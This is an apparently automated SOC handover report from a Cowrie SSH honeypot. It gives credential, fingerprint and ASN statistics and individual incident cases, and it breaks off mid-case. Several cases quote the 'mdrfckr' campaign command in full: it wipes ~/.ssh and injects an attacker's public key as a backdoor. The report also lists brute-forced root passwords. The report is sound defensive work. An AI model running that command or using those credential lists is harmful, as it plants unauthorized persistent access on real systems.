# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-21 |
| **Generated At** | 2026-04-21T17:09:04Z |
| **Shift Time** | 17:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **115** |
| Confirmed Threats | **94** |
| False Positives Filtered | **21** (18.3%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **9** |
| High Severity Cases | **40** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **75** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **105** |
| Unique Credential Pairs | **67** |
| Unique Usernames | **35** |
| Unique Passwords | **66** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `345gs5662d34` | 20 |
| `test` | 6 |
| `oracle` | 3 |
| `user` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `qwerty12` | 2 |
| `root123` | 1 |
| `liverovast#adkz443` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 20 |
| `uucp` | `root123` | 1 |
| `steam` | `liverovast#adkz443` | 1 |
| `jagdish` | `jagdish` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `@WSXzaq1` | `118.35.127.66` | 2026-04-21T16:41:43 |
| `root` | `3245gs5662d34` | `118.35.127.66` | 2026-04-21T16:41:46 |
| `root` | `123456qq@` | `103.182.132.154` | 2026-04-21T16:43:33 |
| `root` | `3245gs5662d34` | `103.182.132.154` | 2026-04-21T16:43:35 |
| `root` | `781220` | `118.35.127.66` | 2026-04-21T16:43:41 |
| `root` | `Aa12345!` | `118.35.127.66` | 2026-04-21T16:45:23 |
| `root` | `pippo` | `118.35.127.66` | 2026-04-21T16:48:50 |
| `root` | `supersecret` | `118.35.127.66` | 2026-04-21T16:50:35 |
| `root` | `China123` | `118.35.127.66` | 2026-04-21T16:52:22 |
| `root` | `Tm@123456` | `103.182.132.154` | 2026-04-21T16:53:12 |
| `root` | `Zr123456@` | `103.182.132.154` | 2026-04-21T16:54:10 |
| `root` | `!QA@WS#ED$RF` | `213.176.16.28` | 2026-04-21T16:55:16 |
| `root` | `3245gs5662d34` | `213.176.16.28` | 2026-04-21T16:55:21 |
| `root` | `Zxcasdqwe123` | `212.156.33.182` | 2026-04-21T16:56:36 |
| `root` | `3245gs5662d34` | `212.156.33.182` | 2026-04-21T16:56:41 |
| `root` | `Qa123456` | `118.35.127.66` | 2026-04-21T16:57:39 |
| `root` | `qwerty12` | `212.156.33.182` | 2026-04-21T17:00:01 |
| `root` | `abc123,./` | `118.35.127.66` | 2026-04-21T17:00:12 |
| `root` | `Nihao123` | `212.156.33.182` | 2026-04-21T17:01:48 |
| `root` | `abcde12345` | `34.91.0.68` | 2026-04-21T17:02:00 |
| `root` | `3245gs5662d34` | `34.91.0.68` | 2026-04-21T17:02:04 |
| `root` | `123456asd` | `212.156.33.182` | 2026-04-21T17:02:42 |
| `root` | `Abcd123456!@#` | `14.103.112.112` | 2026-04-21T17:05:03 |
| `root` | `3245gs5662d34` | `14.103.112.112` | 2026-04-21T17:05:06 |
| `root` | `Pass@word1` | `212.156.33.182` | 2026-04-21T17:06:13 |
| `root` | `Xx123456` | `212.156.33.182` | 2026-04-21T17:07:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **115** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 105 |
| Paramiko (Python) | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 102 | 5 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 102 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.112.112`, `34.91.0.68`, `212.156.33.182`, `213.176.16.28`, `118.35.127.66`, `103.182.132.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **15** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS212238` | Datacamp Limited | 1 | HIGH |
| `AS51396` | Pfcloud UG | 1 | HIGH |
| `AS149526` | GITELENET PRIVATE LIMITED | 1 | HIGH |
| `AS7018` | AT&T Enterprises, LLC | 1 | LOW |
| `AS63567` | Suqian Pugongying Network Service Co.,Ltd | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS133481` | AIS Fibre | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (40)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c166dd5a054c

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:41 |
| **Last Seen** | 2026-04-21 16:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:41:42` | `cowrie.session.connect` |
| `2026-04-21 16:41:42` | `cowrie.client.version` |
| `2026-04-21 16:41:42` | `cowrie.client.kex` |
| `2026-04-21 16:41:43` | `cowrie.login.success` |
| `2026-04-21 16:41:43` | `cowrie.session.params` |
| `2026-04-21 16:41:43` | `cowrie.command.input` |
| `2026-04-21 16:41:43` | `cowrie.command.failed` |
| `2026-04-21 16:41:43` | `cowrie.log.closed` |
| `2026-04-21 16:41:43` | `cowrie.session.params` |
| `2026-04-21 16:41:43` | `cowrie.command.input` |
| `2026-04-21 16:41:44` | `cowrie.session.file_download` |
| `2026-04-21 16:41:44` | `cowrie.log.closed` |
| `2026-04-21 16:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0fce1c04d05

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:41 |
| **Last Seen** | 2026-04-21 16:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:41:46` | `cowrie.session.connect` |
| `2026-04-21 16:41:46` | `cowrie.client.version` |
| `2026-04-21 16:41:46` | `cowrie.client.kex` |
| `2026-04-21 16:41:46` | `cowrie.login.success` |
| `2026-04-21 16:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0012e3bcaee

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:43 |
| **Last Seen** | 2026-04-21 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:43:33` | `cowrie.session.connect` |
| `2026-04-21 16:43:33` | `cowrie.client.version` |
| `2026-04-21 16:43:33` | `cowrie.client.kex` |
| `2026-04-21 16:43:33` | `cowrie.login.success` |
| `2026-04-21 16:43:33` | `cowrie.session.params` |
| `2026-04-21 16:43:33` | `cowrie.command.input` |
| `2026-04-21 16:43:33` | `cowrie.command.failed` |
| `2026-04-21 16:43:33` | `cowrie.log.closed` |
| `2026-04-21 16:43:33` | `cowrie.session.params` |
| `2026-04-21 16:43:33` | `cowrie.command.input` |
| `2026-04-21 16:43:34` | `cowrie.session.file_download` |
| `2026-04-21 16:43:34` | `cowrie.log.closed` |
| `2026-04-21 16:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6108a0a46099

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:43 |
| **Last Seen** | 2026-04-21 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:43:35` | `cowrie.session.connect` |
| `2026-04-21 16:43:35` | `cowrie.client.version` |
| `2026-04-21 16:43:35` | `cowrie.client.kex` |
| `2026-04-21 16:43:35` | `cowrie.login.success` |
| `2026-04-21 16:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc262dc90da1

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:43 |
| **Last Seen** | 2026-04-21 16:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:43:40` | `cowrie.session.connect` |
| `2026-04-21 16:43:40` | `cowrie.client.version` |
| `2026-04-21 16:43:41` | `cowrie.client.kex` |
| `2026-04-21 16:43:41` | `cowrie.login.success` |
| `2026-04-21 16:43:41` | `cowrie.session.params` |
| `2026-04-21 16:43:41` | `cowrie.command.input` |
| `2026-04-21 16:43:41` | `cowrie.command.failed` |
| `2026-04-21 16:43:42` | `cowrie.log.closed` |
| `2026-04-21 16:43:42` | `cowrie.session.params` |
| `2026-04-21 16:43:42` | `cowrie.command.input` |
| `2026-04-21 16:43:42` | `cowrie.session.file_download` |
| `2026-04-21 16:43:42` | `cowrie.log.closed` |
| `2026-04-21 16:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290b060c94a6

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:43 |
| **Last Seen** | 2026-04-21 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:43:44` | `cowrie.session.connect` |
| `2026-04-21 16:43:44` | `cowrie.client.version` |
| `2026-04-21 16:43:44` | `cowrie.client.kex` |
| `2026-04-21 16:43:45` | `cowrie.login.success` |
| `2026-04-21 16:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78af1746d355

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:45 |
| **Last Seen** | 2026-04-21 16:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:45:22` | `cowrie.session.connect` |
| `2026-04-21 16:45:22` | `cowrie.client.version` |
| `2026-04-21 16:45:22` | `cowrie.client.kex` |
| `2026-04-21 16:45:23` | `cowrie.login.success` |
| `2026-04-21 16:45:23` | `cowrie.session.params` |
| `2026-04-21 16:45:23` | `cowrie.command.input` |
| `2026-04-21 16:45:23` | `cowrie.command.failed` |
| `2026-04-21 16:45:23` | `cowrie.log.closed` |
| `2026-04-21 16:45:24` | `cowrie.session.params` |
| `2026-04-21 16:45:24` | `cowrie.command.input` |
| `2026-04-21 16:45:24` | `cowrie.session.file_download` |
| `2026-04-21 16:45:24` | `cowrie.log.closed` |
| `2026-04-21 16:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad4604d6b1e

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:45 |
| **Last Seen** | 2026-04-21 16:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:45:26` | `cowrie.session.connect` |
| `2026-04-21 16:45:26` | `cowrie.client.version` |
| `2026-04-21 16:45:26` | `cowrie.client.kex` |
| `2026-04-21 16:45:27` | `cowrie.login.success` |
| `2026-04-21 16:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba078f80d36c

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:48 |
| **Last Seen** | 2026-04-21 16:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:48:49` | `cowrie.session.connect` |
| `2026-04-21 16:48:49` | `cowrie.client.version` |
| `2026-04-21 16:48:49` | `cowrie.client.kex` |
| `2026-04-21 16:48:50` | `cowrie.login.success` |
| `2026-04-21 16:48:50` | `cowrie.session.params` |
| `2026-04-21 16:48:50` | `cowrie.command.input` |
| `2026-04-21 16:48:50` | `cowrie.command.failed` |
| `2026-04-21 16:48:50` | `cowrie.log.closed` |
| `2026-04-21 16:48:51` | `cowrie.session.params` |
| `2026-04-21 16:48:51` | `cowrie.command.input` |
| `2026-04-21 16:48:51` | `cowrie.session.file_download` |
| `2026-04-21 16:48:51` | `cowrie.log.closed` |
| `2026-04-21 16:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8274f180254

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:48 |
| **Last Seen** | 2026-04-21 16:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:48:53` | `cowrie.session.connect` |
| `2026-04-21 16:48:53` | `cowrie.client.version` |
| `2026-04-21 16:48:53` | `cowrie.client.kex` |
| `2026-04-21 16:48:54` | `cowrie.login.success` |
| `2026-04-21 16:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29f25308574e

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:50 |
| **Last Seen** | 2026-04-21 16:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:50:35` | `cowrie.session.connect` |
| `2026-04-21 16:50:35` | `cowrie.client.version` |
| `2026-04-21 16:50:35` | `cowrie.client.kex` |
| `2026-04-21 16:50:35` | `cowrie.login.success` |
| `2026-04-21 16:50:36` | `cowrie.session.params` |
| `2026-04-21 16:50:36` | `cowrie.command.input` |
| `2026-04-21 16:50:36` | `cowrie.command.failed` |
| `2026-04-21 16:50:36` | `cowrie.log.closed` |
| `2026-04-21 16:50:36` | `cowrie.session.params` |
| `2026-04-21 16:50:36` | `cowrie.command.input` |
| `2026-04-21 16:50:36` | `cowrie.session.file_download` |
| `2026-04-21 16:50:36` | `cowrie.log.closed` |
| `2026-04-21 16:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f07f314d1755

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:50 |
| **Last Seen** | 2026-04-21 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:50:38` | `cowrie.session.connect` |
| `2026-04-21 16:50:38` | `cowrie.client.version` |
| `2026-04-21 16:50:39` | `cowrie.client.kex` |
| `2026-04-21 16:50:39` | `cowrie.login.success` |
| `2026-04-21 16:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5ef6ca7273

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:52 |
| **Last Seen** | 2026-04-21 16:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
